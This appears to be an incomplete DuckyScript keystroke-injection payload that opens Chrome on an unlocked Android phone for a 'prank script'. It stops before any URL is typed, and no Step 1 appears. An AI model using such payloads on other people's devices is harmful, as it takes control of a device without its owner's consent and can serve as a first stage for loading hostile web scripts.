REM Author: TBJr
REM Description: Executes Android prank script - works without Termux!
REM Version: 3.1 - Fixed Chrome opening method (UI navigation instead of shell commands)
REM 
REM This payload works on ANY Android device with Chrome (pre-installed on most)
REM No Termux or special apps required!

REM IMPORTANT: This script uses UI navigation to open Chrome (not shell commands)
REM Device must be unlocked and on home screen for best results

REM Method 1: Web-based execution (Primary - works on all Android devices)

DELAY 1000
REM Step 2: Open Chrome via app launcher
REM Try multiple methods to ensure Chrome opens:
REM Method A: If device has a search bar on home screen, type there
REM Method B: Open app drawer (varies by device - some use swipe up)
REM We'll start typing "chrome" which should work in most launchers
STRING chrome
DELAY 1500
REM Step 3: Select Chrome from search results
ENTER
DELAY 3000
REM Step 4: Chrome should now be open - navigate to URL
